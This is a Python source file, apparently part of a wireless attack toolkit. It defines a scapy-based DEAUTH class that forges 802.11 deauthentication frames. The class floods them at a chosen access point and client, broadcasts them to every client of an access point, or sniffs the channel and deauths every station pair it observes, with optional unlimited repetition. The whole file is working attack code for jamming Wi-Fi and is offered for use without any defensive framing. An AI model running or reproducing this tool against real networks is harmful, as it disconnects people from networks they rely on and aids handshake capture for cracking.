from scapy.sendrecv import sniff
from scapy.sendrecv import sendp
from scapy.config import conf
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Raw
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.dot11 import Dot11Beacon
from utils import org
import signal
import sys
import time
import threading
import exceptions
import binascii
import os
try:
	from scapy.layers.dot11 import EAPOL
except ImportError:
	from scapy.layers.eap import EAPOL


class DEAUTH:

	__AVAIL = False
	__AVAILED = []

	def __init__(self, _if, _deauth, _ap, _cl, _count, _pull, _v):
		self.iface = _if
		self.deauth = _deauth
		self.ap = _ap
		self.cl = _cl
		self.count = _count
		self.unlimited = True if _count == 0 else False
		self.pull = _pull
		self.verbose = _v

	def verify(self):
		if self.__AVAIL:
			return True
		else:
			return False

	def locate(self):
		if not self.ap:
			self.__AVAIL = True
			return
		try:
			self.pull.info("Waiting for the Access Point MAC address to receive... [30]")
			sniff(iface=self.iface, prn=self.collector, timeout=30)
		except ImportError, e:
			if str(e) == "!":
				self.__AVAIL = True

	def collector(self, pkt):
		if pkt.haslayer(Dot11Beacon):
			_sn = pkt.getlayer(Dot11).addr2.lower()
			if _sn == self.ap:
				raise ImportError("!")

	def forge_ap_cl(self):
		_pkt_ap = RadioTap() / Dot11(addr1=self.cl, addr2=self.ap, addr3=self.ap) / Dot11Deauth(reason=7)
		_pkt_cl = RadioTap() / Dot11(addr1=self.ap, addr2=self.cl, addr3=self.cl) / Dot11Deauth(reason=7)

		if self.unlimited:
			while True:
				self.flood_ap_cl(_pkt_ap, _pkt_cl)
		else:
			for _count in range(0, self.count):
				self.flood_ap_cl(_pkt_ap, _pkt_cl)

	def flood_ap_cl(self, _pkt_ap, _pkt_cl):
		if self.verbose:
			self.pull.up("%d %s (%s) %s<>%s %s (%s) %s[DEAUTHENTICATION]%s" % (self.deauth, self.ap.replace(':', '').upper(),\
										 					self.pull.DARKCYAN+org(self.ap).org+self.pull.END, \
										 	 				self.pull.RED, self.pull.END, self.cl.replace(':', '').upper(), \
										 	 				self.pull.DARKCYAN+org(self.cl).org+self.pull.END, \
										 	 				self.pull.BLUE, self.pull.END ))
		else:
			self.pull.up("%d %s %s<>%s %s %s[DEAUTHENTICATION]%s" % (self.deauth, self.ap.replace(':', '').upper(),\
										 	 				self.pull.RED, self.pull.END, self.cl.replace(':', '').upper(), \
										 	 				self.pull.BLUE, self.pull.END ))
		
		sendp(_pkt_ap, iface=self.iface, count=self.deauth, verbose=False)
		sendp(_pkt_cl, iface=self.iface, count=self.deauth, verbose=False)
		time.sleep(1)

	def forge_ap(self):
		_broadct = "ff:ff:ff:ff:ff:ff"
		_pkt_ap = RadioTap() / Dot11(addr1=_broadct, addr2=self.ap, addr3=self.ap) / Dot11Deauth(reason=7)

		if self.unlimited:
			while True:
				self.flood_ap(_pkt_ap, _broadct)
		else:
			for _count in range(0, self.count):
				self.flood_ap(_pkt_ap, _broadct)

	def flood_ap(self, _pkt, _br):
		if self.verbose:
			self.pull.up("%d %s (%s) %s<>%s %s (%s) %s[DEAUTHENTICATION]%s" % (self.deauth, self.ap.replace(':', '').upper(),\
												 					self.pull.DARKCYAN+org(self.ap).org+self.pull.END, \
												 	 				self.pull.RED, self.pull.END, _br.replace(':', '').upper(), \
												 	 				self.pull.DARKCYAN+org(self.cl).org+self.pull.END, \
												 	 				self.pull.BLUE, self.pull.END ))
		else:
			self.pull.up("%d %s %s<>%s %s %s[DEAUTHENTICATION]%s" % (self.deauth, self.ap.replace(':', '').upper(),\
												 	 				self.pull.RED, self.pull.END, _br.replace(':', '').upper(), \
												 	 				self.pull.BLUE, self.pull.END ))
		sendp(_pkt, iface=self.iface, count=self.deauth, verbose=False)
		time.sleep(1)

	def shoot(self, _sn, _rc):
		_pkt_ap_to_cl = RadioTap() / Dot11(addr1=_rc, addr2=_sn, addr3=_sn) / Dot11Deauth(reason=7)
		_pkt_cl_to_ap = RadioTap() / Dot11(addr1=_sn, addr2=_rc, addr3=_rc) / Dot11Deauth(reason=7)

		sendp(_pkt_ap_to_cl, iface=self.iface, count=self.deauth, verbose=False)
		sendp(_pkt_cl_to_ap, iface=self.iface, count=self.deauth, verbose=False)
		time.sleep(0.80)


	def flood_silencer(self, pkt):
		if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2L and not pkt.haslayer(EAPOL):
			_sn = pkt.getlayer(Dot11).addr2
			_rc = pkt.getlayer(Dot11).addr1

			if self.verbose:
				self.pull.up("%d %s (%s) %s<>%s %s (%s) %s[DEAUTHENTICATION]%s" % (self.deauth, _sn.replace(':', '').upper(), self.pull.DARKCYAN+org(_sn).org+self.pull.END, \
																self.pull.RED, self.pull.END, _rc.replace(':', '').upper(), \
																self.pull.DARKCYAN+org(_rc).org+self.pull.END, \
																self.pull.BLUE, self.pull.END))
			else:
				self.pull.up("%d %s %s<>%s %s %s[DEAUTHENTICATION]%s" % (self.deauth, _sn.replace(':', '').upper(), \
																self.pull.RED, self.pull.END, _rc.replace(':', '').upper(), \
																self.pull.BLUE, self.pull.END))
			self.shoot(_sn, _rc)

	def flood(self):
		sniff(iface=self.iface, prn=self.flood_silencer)

	def jam(self):
		if self.ap and self.cl:
			self.forge_ap_cl()
		elif self.ap and not(self.cl):
			self.forge_ap()
		else:
			self.flood()